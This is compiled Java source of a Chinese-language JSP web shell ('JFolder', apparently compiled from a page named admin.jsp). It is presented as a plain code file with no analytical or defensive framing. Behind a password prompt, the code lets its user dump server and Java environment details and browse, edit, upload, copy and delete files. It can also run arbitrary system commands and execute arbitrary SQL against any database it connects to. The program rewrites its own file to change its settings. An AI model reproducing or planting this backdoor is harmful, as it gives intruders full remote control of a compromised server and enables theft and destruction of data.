  				sRet += "</table>\n";
  				
  				rs.close();
  			} else {
  				if (_dbStatement.execute(sql)) {
  					sRet = "sql\u8bed\u53e5\u6267\u884c\u6210\u529f";
  				} else {
  					sRet = "<font color=\"red\">sql\u8bed\u53e5\u6267\u884c\u5931\u8d25</font>";
  				}
  			}
  		} catch (SQLException e) {
  			sRet = "<font color=\"red\">sql\u8bed\u53e5\u6267\u884c\u5931\u8d25</font>";
  		}
  	}
  	
  	return sRet;
  }
  
  public void DBRelease() {
  	try {
  		if (_dbStatement != null) {
  			_dbStatement.close();
  			_dbStatement = null;
  		}
  		
  		if (_dbConnection != null) {
  			_dbConnection.close();
  			_dbConnection = null;
  		}
  	} catch (SQLException e) {
  	
  	}
  }
  
  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  
  class JshellConfig {
  	private String _jshellContent = null;
  	private String _path = null;
  
  	public JshellConfig(String path) throws JshellConfigException {
  		_path = path;
  		read();
  	}
  	
  	private void read() throws JshellConfigException {
  		try {
  			FileReader jshell = new FileReader(new File(_path));
  			char[] buffer = new char[1024];
  			int nChars;
  			_jshellContent = "";
  			
  			while ((nChars = jshell.read(buffer, 0, 1024)) != -1) {
  				_jshellContent += new String(buffer, 0, nChars);
  			}
  			
  			jshell.close();
  		} catch (IOException e) {
  			throw new JshellConfigException("\u6253\u5f00\u6587\u4ef6\u5931\u8d25");
  		}
  	}
  	
  	public void save() throws JshellConfigException {
  		FileWriter jshell = null;
  	
  		try {
  			jshell = new FileWriter(new File(_path));
  			char[] buffer = _jshellContent.toCharArray();
  			int start = 0;
  			int size = 1024;
  			
  			for (start = 0; start < buffer.length - 1 - size; start += size) {
  				jshell.write(buffer, start, size);
  			}
  			
  			jshell.write(buffer, start, buffer.length - 1 - start);
  		} catch (IOException e) {
  			new JshellConfigException("\u5199\u6587\u4ef6\u5931\u8d25");
  		} finally {
  			try {
  				jshell.close();
  			} catch (IOException e) {
  			
  			}
  		}
  	}
  	
  	public void setPassword(String password) throws JshellConfigException {
  		Pattern p = Pattern.compile("\\w+");
  		Matcher m = p.matcher(password);
  		
  		if (! m.matches()) {
  			throw new JshellConfigException("\u5bc6\u7801\u4e0d\u80fd\u6709\u9664\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\u4ee5\u5916\u7684\u5b57\u7b26");
  		}
  		
  		p = Pattern.compile("private\\sString\\s_password\\s=\\s\"" + _password + "\"");
  		m = p.matcher(_jshellContent);
  		if (! m.find()) {
  			throw new JshellConfigException("\u7a0b\u5e8f\u4f53\u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539");
  		}
  		
  		_jshellContent = m.replaceAll("private String _password = \"" + password + "\"");
  		
  		//return HTMLEncode(_jshellContent);
  	}
  	
  	public void setEncodeType(String encodeType) throws JshellConfigException {
  		Pattern p = Pattern.compile("[A-Za-z0-9]+");
  		Matcher m = p.matcher(encodeType);
  		
  		if (! m.matches()) {
  			throw new JshellConfigException("\u7f16\u7801\u683c\u5f0f\u53ea\u80fd\u662f\u5b57\u6bcd\u548c\u6570\u5b57\u7684\u7ec4\u5408");
  		}
  		
  		p = Pattern.compile("private\\sString\\s_encodeType\\s=\\s\"" + _encodeType + "\"");
  		m = p.matcher(_jshellContent);
  		
  		if (! m.find()) {
  			throw new JshellConfigException("\u7a0b\u5e8f\u4f53\u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539");
  		}
  		
  		_jshellContent = m.replaceAll("private String _encodeType = \"" + encodeType + "\"");
  		//return HTMLEncode(_jshellContent);
  	}
  	
  	public void setSessionTime(String sessionTime) throws JshellConfigException {
  		Pattern p = Pattern.compile("\\d+");
  		Matcher m = p.matcher(sessionTime);
  		
  		if (! m.matches()) {
  			throw new JshellConfigException("session\u8d85\u65f6\u65f6\u95f4\u53ea\u80fd\u586b\u6570\u5b57");
  		}
  		
  		p = Pattern.compile("private\\sint\\s_sessionOutTime\\s=\\s" + _sessionOutTime);
  		m = p.matcher(_jshellContent);
  		
  		if (! m.find()) {
  			throw new JshellConfigException("\u7a0b\u5e8f\u4f53\u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539");
  		}
  		
  		_jshellContent = m.replaceAll("private int _sessionOutTime = " + sessionTime);
  		//return HTMLEncode(_jshellContent);
  	}
  	
  	public void setTextFileTypes(String[] textFileTypes) throws JshellConfigException {
  		Pattern p = Pattern.compile("\\w+");
  		Matcher m = null;
  		int i;
  		String fileTypes = "";
  		String tmpFileTypes = "";
  		
  		for (i = 0; i < textFileTypes.length; i ++) {
  			m = p.matcher(textFileTypes[i]);
  			
  			if (! m.matches()) {
  				throw new JshellConfigException("\u6269\u5c55\u540d\u53ea\u80fd\u662f\u5b57\u6bcd\u6570\u5b57\u548c\u4e0b\u5212\u7ebf\u7684\u7ec4\u5408");
  			}
  			
  			if (i != textFileTypes.length - 1)
  				fileTypes += "\"" + textFileTypes[i] + "\"" + ", ";
  			else
  				fileTypes += "\"" + textFileTypes[i] + "\"";
  		}
  		
  		for (i = 0; i < _textFileTypes.length; i ++) {
  			if (i != _textFileTypes.length - 1)
  				tmpFileTypes += "\"" + _textFileTypes[i] + "\"" + ", ";
  			else
  				tmpFileTypes += "\"" + _textFileTypes[i] + "\"";
  		}
  		
  		p = Pattern.compile(tmpFileTypes);
  		m = p.matcher(_jshellContent);
  		
  		if (! m.find()) {
  			throw new JshellConfigException("\u7a0b\u5e8f\u6587\u4ef6\u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539");
  		}
  		
  		_jshellContent = m.replaceAll(fileTypes);
  		
  		//return HTMLEncode(_jshellContent);
  	}
  	
  	public String getContent() {
  		return HTMLEncode(_jshellContent);
  	}
  }
  
  class JshellConfigException extends Exception {
  	public JshellConfigException(String message) {
  		super(message);
  	}
  }

  
  public void
  _jspService(javax.servlet.http.HttpServletRequest request,
              javax.servlet.http.HttpServletResponse response)
    throws java.io.IOException, javax.servlet.ServletException
  {
    javax.servlet.http.HttpSession session = request.getSession(true);
    com.caucho.server.webapp.Application _jsp_application = _caucho_getApplication();
    javax.servlet.ServletContext application = _jsp_application;
    com.caucho.jsp.PageContextImpl pageContext = com.caucho.jsp.QJspFactory.allocatePageContext(this, _jsp_application, request, response, null, session, 8192, true, false);
    javax.servlet.jsp.JspWriter out = pageContext.getOut();
    javax.servlet.ServletConfig config = getServletConfig();
    javax.servlet.Servlet page = this;
    response.setContentType("text/html; charset=UTF-8");
    request.setCharacterEncoding("UTF-8");
    try {
      out.write(_jsp_string0, 0, _jsp_string0.length);
      
session.setMaxInactiveInterval(_sessionOutTime * 60);

if (request.getParameter("password") == null && session.getAttribute("password") == null) {
// show the login form
//================================================================================================

      out.write(_jsp_string1, 0, _jsp_string1.length);
      
//================================================================================================
// end of the login form
} else {
	String password = null;
	
	if (session.getAttribute("password") == null) {
		password = (String)request.getParameter("password");
		
		if (validate(password) == false) {
			out.println("<div align=\"center\"><font color=\"red\"><li>\u54ce\u5440\uff0c\u5012\u9709\u6b7b\u5566!</font></div>");
			out.close();
			return;
		}
		
		session.setAttribute("password", password);
	} else {
		password = (String)session.getAttribute("password");
	}
	
	String action = null;
	

	if (request.getParameter("action") == null)
		action = "main";
	else 
		action = (String)request.getParameter("action");
		
	if (action.equals("exit")) {
		session.removeAttribute("password");
		response.sendRedirect(request.getRequestURI());
		out.close();
		return;
	}

// show the main menu
//====================================================================================

      out.write(_jsp_string2, 0, _jsp_string2.length);
      
	out.println("var action = \"" + action + "\"");

      out.write(_jsp_string3, 0, _jsp_string3.length);
      
//=====================================================================================
// end of main menu

	if (action.equals("main")) {
// print the system info table
//=======================================================================================

      out.write(_jsp_string4, 0, _jsp_string4.length);
      out.print((request.getServerName()));
      out.write(_jsp_string5, 0, _jsp_string5.length);
      out.print((request.getServerPort()));
      out.write(_jsp_string6, 0, _jsp_string6.length);
      out.print((System.getProperty("os.name") + " " + System.getProperty("os.version") + " " + System.getProperty("os.arch")));
      out.write(_jsp_string7, 0, _jsp_string7.length);
      out.print((System.getProperty("user.name")));
      out.write(_jsp_string8, 0, _jsp_string8.length);
      out.print((System.getProperty("user.home")));
      out.write(_jsp_string9, 0, _jsp_string9.length);
      out.print((System.getProperty("user.dir")));
      out.write(_jsp_string10, 0, _jsp_string10.length);
      out.print((request.getRequestURI()));
      out.write(_jsp_string11, 0, _jsp_string11.length);
      out.print((request.getRealPath(request.getServletPath())));
      out.write(_jsp_string12, 0, _jsp_string12.length);
      out.print((request.getProtocol()));
      out.write(_jsp_string13, 0, _jsp_string13.length);
      out.print((application.getServerInfo()));
      out.write(_jsp_string14, 0, _jsp_string14.length);
      out.print((System.getProperty("java.version")));
      out.write(_jsp_string15, 0, _jsp_string15.length);
      out.print((System.getProperty("java.home")));
      out.write(_jsp_string16, 0, _jsp_string16.length);
      out.print((System.getProperty("java.vm.specification.version")));
      out.write(_jsp_string17, 0, _jsp_string17.length);
      out.print((System.getProperty("java.vm.name")));
      out.write(_jsp_string18, 0, _jsp_string18.length);
      out.print((System.getProperty("java.class.path")));
      out.write(_jsp_string19, 0, _jsp_string19.length);
      out.print((System.getProperty("java.library.path")));
      out.write(_jsp_string20, 0, _jsp_string20.length);
      out.print((System.getProperty("java.io.tmpdir")));
      out.write(_jsp_string21, 0, _jsp_string21.length);
      out.print((System.getProperty("java.compiler") == null ? "" : System.getProperty("java.compiler")));
      out.write(_jsp_string22, 0, _jsp_string22.length);
      out.print((System.getProperty("java.ext.dirs")));
      out.write(_jsp_string23, 0, _jsp_string23.length);
      out.print((request.getRemoteAddr()));
      out.write(_jsp_string24, 0, _jsp_string24.length);
      out.print((request.getRemoteHost()));
      out.write(_jsp_string25, 0, _jsp_string25.length);
      out.print((request.getRemoteUser() == null ? "" : request.getRemoteUser()));
      out.write(_jsp_string26, 0, _jsp_string26.length);
      out.print((request.getScheme()));
      out.write(_jsp_string27, 0, _jsp_string27.length);
      out.print((request.isSecure() == true ? "\u662f" : "\u5426"));
      out.write(_jsp_string28, 0, _jsp_string28.length);
      
//=======================================================================================
// end of printing the system info table
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	} else if (action.equals("filesystem")) {
		String curPath = "";
		String result = "";
		String fsAction = "";
		
		if (request.getParameter("curPath") == null) {
			curPath = request.getRealPath(request.getServletPath());
			curPath = pathConvert((new File(curPath)).getParent());
		} else {
			curPath = Unicode2GB((String)request.getParameter("curPath"));
		}
		
		if (request.getParameter("fsAction") == null) {
			fsAction = "list";
		} else {
			fsAction = (String)request.getParameter("fsAction");
		}
		
		if (fsAction.equals("list"))
			result = listFiles(curPath, request.getRequestURI() + "?action=" + action);
		else if (fsAction.equals("browse")) {
			result = listFiles(new File(curPath).getParent(), request.getRequestURI() + "?action=" + action);
			result += browseFile(curPath);
		}
		else if (fsAction.equals("open"))
			result = openFile(curPath, request.getRequestURI() + "?action=" + action);
		else if (fsAction.equals("save")) {
			if (request.getParameter("fileContent") == null) {
				result = "<font color=\"red\">\u9875\u9762\u5bfc\u822a\u9519\u8bef</font>";
			} else {
				String fileContent = Unicode2GB((String)request.getParameter("fileContent"));
				result = saveFile(curPath, request.getRequestURI() + "?action=" + action, fileContent);
			}
		} else if (fsAction.equals("createFolder")) {
			if (request.getParameter("folderName") == null) {
				result = "<font color=\"red\">\u76ee\u5f55\u540d\u4e0d\u80fd\u4e3a\u7a7a</font>";
			} else {
				String folderName = Unicode2GB(request.getParameter("folderName").trim());
				if (folderName.equals("")) {
					result = "<font color=\"red\">\u76ee\u5f55\u540d\u4e0d\u80fd\u4e3a\u7a7a</font>"; 
				} else {
					result = createFolder(curPath, request.getRequestURI() + "?action=" + action, folderName);
				}
			}
		} else if (fsAction.equals("createFile")) {
			if (request.getParameter("fileName") == null) {
				result = "<font color=\"red\">\u6587\u4ef6\u540d\u4e0d\u80fd\u4e3a\u7a7a</font>";
			} else {
				String fileName = Unicode2GB(request.getParameter("fileName").trim());
				if (fileName.equals("")) {
					result = "<font color=\"red\">\u6587\u4ef6\u540d\u4e0d\u80fd\u4e3a\u7a7a</font>";
				} else {
					result = createFile(curPath, request.getRequestURI() + "?action=" + action, fileName);
				}
			}
		} else if (fsAction.equals("deleteFile")) {
			if (request.getParameter("filesDelete") == null) {
				result = "<font color=\"red\">\u6ca1\u6709\u9009\u62e9\u8981\u5220\u9664\u7684\u6587\u4ef6</font>";
			} else {
				String[] files2Delete = (String[])request.getParameterValues("filesDelete");
				if (files2Delete.length == 0) {
					result = "<font color=\"red\">\u6ca1\u6709\u9009\u62e9\u8981\u5220\u9664\u7684\u6587\u4ef6</font>";
				} else {
					for (int n = 0; n < files2Delete.length; n ++) {
						files2Delete[n] = Unicode2GB(files2Delete[n]);
					}
					result = deleteFile(curPath, request.getRequestURI() + "?action=" + action, files2Delete);
				}
			}
		} else if (fsAction.equals("saveAs")) {
			if (request.getParameter("fileContent") == null) {
				result = "<font color=\"red\">\u9875\u9762\u5bfc\u822a\u9519\u8bef</font>";
			} else {
				String fileContent = Unicode2GB(request.getParameter("fileContent"));
				result = saveAs(curPath, request.getRequestURI() + "?action=" + action, fileContent);
			}
		} else if (fsAction.equals("upload")) {
			result = uploadFile(request, curPath, request.getRequestURI() + "?action=" + action);
		} else if (fsAction.equals("copyto")) {
			if (request.getParameter("filesDelete") == null || request.getParameter("dstPath") == null) {
				result = "<font color=\"red\">\u6ca1\u6709\u9009\u62e9\u8981\u590d\u5236\u7684\u6587\u4ef6</font>";
			} else {
				String[] files2Copy = request.getParameterValues("filesDelete");
				String dstPath = request.getParameter("dstPath").trim();
				if (files2Copy.length == 0) {
					result = "<font color=\"red\">\u6ca1\u6709\u9009\u62e9\u8981\u590d\u5236\u7684\u6587\u4ef6</font>";
				} else if (dstPath.equals("")) {
					result = "<font color=\"red\">\u6ca1\u6709\u586b\u5199\u8981\u590d\u5236\u5230\u7684\u76ee\u5f55\u8def\u5f84</font>";
				} else {
					for (int i = 0; i < files2Copy.length; i ++)
						files2Copy[i] = Unicode2GB(files2Copy[i]);
					
					result = copyFiles(curPath, request.getRequestURI() + "?action=" + action, files2Copy, Unicode2GB(dstPath));
				}
			}
		} else if (fsAction.equals("rename")) {
			if (request.getParameter("fileRename") == null) {
				result = "<font color=\"red\">\u9875\u9762\u5bfc\u822a\u9519\u8bef</font>";
			} else {
				String file2Rename = request.getParameter("fileRename").trim();
				String newName = request.getParameter("newName").trim();
				if (file2Rename.equals("")) {
					result = "<font color=\"red\">\u6ca1\u6709\u9009\u62e9\u8981\u91cd\u547d\u540d\u7684\u6587\u4ef6</font>";
				} else if (newName.equals("")) {
					result = "<font color=\"red\">\u6ca1\u6709\u586b\u5199\u65b0\u6587\u4ef6\u540d</font>";
				} else {
					result = renameFile(curPath, request.getRequestURI() + "?action=" + action, Unicode2GB(file2Rename), Unicode2GB(newName));
				}			
			}
		}

      out.write(_jsp_string29, 0, _jsp_string29.length);
      out.print(( request.getRequestURI() + "?action=" + action));
      out.write(_jsp_string30, 0, _jsp_string30.length);
      out.print((curPath));
      out.write(_jsp_string31, 0, _jsp_string31.length);
      out.print(( result.trim().equals("")?"&nbsp;" : result));
      out.write(_jsp_string28, 0, _jsp_string28.length);
      		
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	} else if (action.equals("command")) {
		String cmd = "";
		InputStream ins = null;
		String result = "";
		
		if (request.getParameter("command") != null) {		
			cmd = (String)request.getParameter("command");
			result = exeCmd(cmd);
		}
// print the command form
//========================================================================================

      out.write(_jsp_string32, 0, _jsp_string32.length);
      out.print((request.getRequestURI() + "?action=" + action));
      out.write(_jsp_string33, 0, _jsp_string33.length);
      out.print((cmd));
      out.write(_jsp_string34, 0, _jsp_string34.length);
      out.print((result == "" ? "&nbsp;" : result));
      out.write(_jsp_string28, 0, _jsp_string28.length);
      
//=========================================================================================
// end of printing command form
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	} else if (action.equals("database")) {
		String dbAction = "";
		String result = "";
		String dbType = "";
		String dbServer = "";
		String dbPort = "";
		String dbUsername = "";
		String dbPassword = "";
		String dbName = "";
		String dbResult = "";
		String sql = "";
		
		if (request.getParameter("dbAction") == null) {
			dbAction = "main";
		} else {
			dbAction = request.getParameter("dbAction").trim();
			if (dbAction.equals(""))
				dbAction = "main";
		}
		
		if (dbAction.equals("main")) {
			result = "&nbsp;";
		} else if (dbAction.equals("dbConnect")) {
			if (request.getParameter("dbType") == null ||
				request.getParameter("dbServer") == null ||
				request.getParameter("dbPort") == null ||
				request.getParameter("dbUsername") == null ||
				request.getParameter("dbPassword") == null ||
				request.getParameter("dbName") == null) {
				response.sendRedirect(request.getRequestURI() + "?action=" + action);
			} else {
				dbType = request.getParameter("dbType").trim();
				dbServer = request.getParameter("dbServer").trim();
				dbPort = request.getParameter("dbPort").trim();
				dbUsername = request.getParameter("dbUsername").trim();
				dbPassword = request.getParameter("dbPassword").trim();
				dbName = request.getParameter("dbName").trim();
				
				if (DBInit(dbType, dbServer, dbPort, dbUsername, dbPassword, dbName)) {
					if (DBConnect(dbUsername, dbPassword)) {
						if (request.getParameter("sql") != null) {
							sql = request.getParameter("sql").trim();
							if (! sql.equals("")) {
								dbResult = DBExecute(sql);
							}
						}
						
						result =  "<script language=\"javascript\">\n";
						result += "<!--\n";
						result += "function exeSql() {\n";
						result += "    if (ltrim(document.dbInfo.sql.value) != \"\")\n";
						result += "        document.dbInfo.submit();";
						result += "}\n";
						result += "\n";
						result += "function resetIt() {\n";
						result += "	   document.dbInfo.sql.value = \"\";";
						result += "}\n";
						result += "//-->\n";
						result += "</script>\n";
						result += "sql\u8bed\u53e5<br/><textarea name=\"sql\" cols=\"70\" rows=\"6\">" + sql + "</textarea><br/><input type=\"submit\" class=\"button\" onclick=\"javascript:exeSql()\" value=\"\u6267\u884c\"/>&nbsp;<input type=\"reset\" class=\"button\" onclick=\"javascript:resetIt()\" value=\"\u6e05\u7a7a\"/>\n";
						
						DBRelease();
					} else {
						result = "<font color=\"red\">\u6570\u636e\u5e93\u8fde\u63a5\u5931\u8d25</font>";
					}
				} else {
					result = "<font color=\"red\">\u6570\u636e\u5e93\u8fde\u63a5\u9a71\u52a8\u6ca1\u6709\u627e\u5230</font>";
				}				
			}
		}

      out.write(_jsp_string35, 0, _jsp_string35.length);
      
out.println("var selectedType = \"" + dbType + "\";");

      out.write(_jsp_string36, 0, _jsp_string36.length);
      out.print((request.getRequestURI() + "?action=" + action + "&dbAction=dbConnect"));
      out.write(_jsp_string37, 0, _jsp_string37.length);
      out.print((dbServer));
      out.write(_jsp_string38, 0, _jsp_string38.length);
      out.print((dbPort));
      out.write(_jsp_string39, 0, _jsp_string39.length);
      out.print((dbUsername));
      out.write(_jsp_string40, 0, _jsp_string40.length);
      out.print((dbPassword));
      out.write(_jsp_string41, 0, _jsp_string41.length);
      out.print((dbName));
      out.write(_jsp_string42, 0, _jsp_string42.length);
      out.print((result));
      out.write(_jsp_string43, 0, _jsp_string43.length);
      out.print((dbResult));
      out.write(_jsp_string28, 0, _jsp_string28.length);
      		

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////		
	} else if (action.equals("config")) {
		String cfAction = "";
		int i;
		
		if (request.getParameter("cfAction") == null) {

			cfAction = "main";
		} else {
			cfAction = request.getParameter("cfAction").trim();
			if (cfAction.equals(""))
				cfAction = "main";
		}
		
		if (cfAction.equals("main")) {
// start of config form
//==========================================================================================

      out.write(_jsp_string44, 0, _jsp_string44.length);
      out.print((request.getRequestURI() + "?action=config&cfAction=save"));
      out.write(_jsp_string45, 0, _jsp_string45.length);
      out.print((_password));
      out.write(_jsp_string46, 0, _jsp_string46.length);
      out.print((_encodeType));
      out.write(_jsp_string47, 0, _jsp_string47.length);
      out.print((_sessionOutTime));
      out.write(_jsp_string48, 0, _jsp_string48.length);
      
		for (i = 0; i < _textFileTypes.length; i ++) {

      out.write(_jsp_string49, 0, _jsp_string49.length);
      out.print((_textFileTypes[i]));
      out.write(_jsp_string50, 0, _jsp_string50.length);
      out.print((_textFileTypes[i]));
      out.write(_jsp_string51, 0, _jsp_string51.length);
      
 		}

      out.write(_jsp_string52, 0, _jsp_string52.length);
      
		} else if (cfAction.equals("save")) {
			if (request.getParameter("password") == null || 
				request.getParameter("encode") == null || 
				request.getParameter("sessionTime") == null ||
				request.getParameterValues("textFileTypes") == null) {
				response.sendRedirect(request.getRequestURI());
			}
			
			String result = "";
			
			String newPassword = request.getParameter("password").trim();
			String newEncodeType = request.getParameter("encode").trim();
			String newSessionTime = request.getParameter("sessionTime").trim();
			String[] newTextFileTypes = request.getParameterValues("textFileTypes");
			String jshellPath = request.getRealPath(request.getServletPath());
			
			try {
				JshellConfig jconfig = new JshellConfig(jshellPath);
				jconfig.setPassword(newPassword);
				jconfig.setEncodeType(newEncodeType);
				jconfig.setSessionTime(newSessionTime);
				jconfig.setTextFileTypes(newTextFileTypes);
				jconfig.save();
				result += "\u8bbe\u7f6e\u4fdd\u5b58\u6210\u529f\uff0c\u6b63\u5728\u8fd4\u56de\uff0c\u8bf7\u7a0d\u5019\u2026\u2026";
				result += "<meta http-equiv=\"refresh\" content=\"2;url=" + request.getRequestURI() + "?action=" + request.getParameter("action") + "\">";
			} catch (JshellConfigException e) {
				result = "<font color=\"red\">" + e.getMessage() + "</font>"; 
			}


      out.write(_jsp_string53, 0, _jsp_string53.length);
      out.print((result == "" ? "&nbsp;" : result));
      out.write(_jsp_string28, 0, _jsp_string28.length);
      
		}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//==========================================================================================
// end of config form
	} else if (action.equals("about")) {
// start of about
//==========================================================================================

      out.write(_jsp_string54, 0, _jsp_string54.length);
      	
//==========================================================================================
	}
}

      out.write(_jsp_string55, 0, _jsp_string55.length);
    } catch (java.lang.Throwable _jsp_e) {
      pageContext.handlePageException(_jsp_e);
    } finally {
      com.caucho.jsp.QJspFactory.freePageContext(pageContext);
    }
  }

  private java.util.ArrayList _caucho_depends = new java.util.ArrayList();

  public java.util.ArrayList _caucho_getDependList()
  {
    return _caucho_depends;
  }

  public void _caucho_addDepend(com.caucho.make.PersistentDependency depend)
  {
    super._caucho_addDepend(depend);
    com.caucho.jsp.JavaPage.addDepend(_caucho_depends, depend);
  }

  public boolean _caucho_isModified()
  {
    if (_caucho_isDead)
      return true;
    if (com.caucho.util.CauchoSystem.getVersionId() != -6418134904411496499L)
      return true;
    for (int i = _caucho_depends.size() - 1; i >= 0; i--) {
      com.caucho.make.Dependency depend;
      depend = (com.caucho.make.Dependency) _caucho_depends.get(i);
      if (depend.isModified())
        return true;
    }
    return false;
  }

  public long _caucho_lastModified()
  {
    return 0;
  }

  public void destroy()
  {
      _caucho_isDead = true;
      super.destroy();
  }

  public void init(com.caucho.vfs.Path appDir)
    throws javax.servlet.ServletException
  {
    com.caucho.vfs.Path resinHome = com.caucho.util.CauchoSystem.getResinHome();
    com.caucho.vfs.MergePath mergePath = new com.caucho.vfs.MergePath();
    mergePath.addMergePath(appDir);
    mergePath.addMergePath(resinHome);
    com.caucho.loader.DynamicClassLoader loader;
    loader = (com.caucho.loader.DynamicClassLoader) getClass().getClassLoader();
    String resourcePath = loader.getResourcePathSpecificFirst();
    mergePath.addClassPath(resourcePath);
    com.caucho.vfs.Depend depend;
    depend = new com.caucho.vfs.Depend(appDir.lookup("admin.jsp"), -8988798415199567561L, false);
    com.caucho.jsp.JavaPage.addDepend(_caucho_depends, depend);
  }

  private final static char []_jsp_string0;
  private final static char []_jsp_string13;
  private final static char []_jsp_string18;
  private final static char []_jsp_string53;
  private final static char []_jsp_string17;
  private final static char []_jsp_string2;
  private final static char []_jsp_string5;
  private final static char []_jsp_string11;
  private final static char []_jsp_string23;
  private final static char []_jsp_string45;
  private final static char []_jsp_string39;
  private final static char []_jsp_string12;
  private final static char []_jsp_string22;
  private final static char []_jsp_string16;
  private final static char []_jsp_string37;
  private final static char []_jsp_string47;
  private final static char []_jsp_string48;
  private final static char []_jsp_string34;
  private final static char []_jsp_string42;
  private final static char []_jsp_string10;
  private final static char []_jsp_string31;
  private final static char []_jsp_string6;
  private final static char []_jsp_string15;
  private final static char []_jsp_string8;
  private final static char []_jsp_string38;
  private final static char []_jsp_string44;
  private final static char []_jsp_string28;
  private final static char []_jsp_string43;
  private final static char []_jsp_string14;
  private final static char []_jsp_string26;
  private final static char []_jsp_string24;
  private final static char []_jsp_string33;
  private final static char []_jsp_string32;
  private final static char []_jsp_string7;
  private final static char []_jsp_string4;
  private final static char []_jsp_string29;
  private final static char []_jsp_string20;
  private final static char []_jsp_string1;
  private final static char []_jsp_string30;
  private final static char []_jsp_string40;
  private final static char []_jsp_string50;
  private final static char []_jsp_string21;
  private final static char []_jsp_string54;
  private final static char []_jsp_string36;
  private final static char []_jsp_string41;
  private final static char []_jsp_string19;
  private final static char []_jsp_string55;
  private final static char []_jsp_string25;
  private final static char []_jsp_string51;
  private final static char []_jsp_string27;
  private final static char []_jsp_string46;
  private final static char []_jsp_string3;
  private final static char []_jsp_string35;
  private final static char []_jsp_string9;
  private final static char []_jsp_string49;
  private final static char []_jsp_string52;
  static {
    _jsp_string0 = "\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<html>\r\n<head>\r\n<title>JFolder \u534e\u590f\u732a\u5934\u4e09\u4fee\u6539\u7248</title>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">\r\n</head>\r\n<style>\r\nbody {\r\n	font-size: 14px;\r\n	font-family: \u5b8b\u4f53;\r\n	background-color: #CCCCCC;\r\n}\r\n\r\ntd {\r\n	font-size: 14px;\r\n	font-family: \u5b8b\u4f53;\r\n}\r\n\r\ninput.textbox {\r\n	border: black solid 1;\r\n	font-size: 12px;\r\n	height: 18px;\r\n}\r\n\r\ninput.button {\r\n	font-size: 12px;\r\n	font-family: \u5b8b\u4f53;\r\n	border: black solid 1;\r\n}\r\n\r\ntd.datarows {\r\n	font-size: 14px;\r\n	font-family: \u5b8b\u4f53;\r\n	height: 25px;\r\n}\r\n\r\ntextarea {\r\n	border: black solid 1;\r\n}\r\n\r\n.inputLogin {\r\n	font-size: 9pt;\r\n	border: 1px solid lightgrey;\r\n	background-color: lightgrey;\r\n}\r\n\r\n.table1 {\r\n	BORDER: gray 0px ridge;\r\n}\r\n\r\n.td2 {\r\n	BORDER-RIGHT: #ffffff 0px solid;\r\n	BORDER-TOP: #ffffff 1px solid;\r\n	BORDER-LEFT: #ffffff 1px solid;\r\n	BORDER-BOTTOM: #ffffff 0px solid;\r\n	BACKGROUND-COLOR: lightgrey;\r\n	height: 18px;\r\n}\r\n\r\n.tr1 {\r\n	BACKGROUND-color: gray\r\n}\r\n</style>\r\n<script language=\"JavaScript\">\r\n<!--\r\nfunction ltrim(str) {\r\n	while (str.indexOf(0) == \" \")\r\n		str = str.substring(1);\r\n		\r\n	return str;\r\n}\r\n\r\nfunction changeAction(obj) {\r\n	obj.submit();\r\n}\r\n//-->\r\n</script>\r\n<body>\r\n".toCharArray();
    _jsp_string13 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u670d\u52a1\u5668\u8f6f\u4ef6\u7248\u672c\u4fe1\u606f</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string18 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">JAVA\u7c7b\u8def\u5f84</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string53 = "\r\n<table align=\"center\" width=\"600\" border=\"0\" cellpadding=\"2\"\r\n	cellspacing=\"1\" bgcolor=\"#CCCCCC\">\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td>".toCharArray();
    _jsp_string17 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">JAVA\u865a\u62df\u673a\u540d</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string2 = "\r\n<table align=\"center\" width=\"600\" border=\"0\" cellpadding=\"2\"\r\n	cellspacing=\"0\">\r\n	<form name=\"form1\" method=\"get\">\r\n	<tr bgcolor=\"#CCCCCC\">\r\n		<td id=\"title\"><!--[\u7a0b\u5e8f\u9996\u9875]--></td>\r\n		<td align=\"right\"><select name=\"action\"\r\n			onChange=\"javascript:changeAction(document.form1)\">\r\n			<option value=\"main\">\u7a0b\u5e8f\u9996\u9875</option>\r\n			<option value=\"filesystem\">\u6587\u4ef6\u7cfb\u7edf</option>\r\n			<option value=\"command\">\u7cfb\u7edf\u547d\u4ee4</option>\r\n			<option value=\"database\">\u6570\u636e\u5e93</option>\r\n			<option value=\"config\">\u7a0b\u5e8f\u914d\u7f6e</option>\r\n			<option value=\"about\">\u5173\u4e8e\u7a0b\u5e8f</option>\r\n			<option value=\"exit\">\u9000\u51fa\u7a0b\u5e8f</option>\r\n		</select> <script language=\"JavaScript\">\r\n".toCharArray();
    _jsp_string5 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u670d\u52a1\u5668\u7aef\u53e3</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string11 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u7a0b\u5e8f\u7edd\u5bf9\u8def\u5f84</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
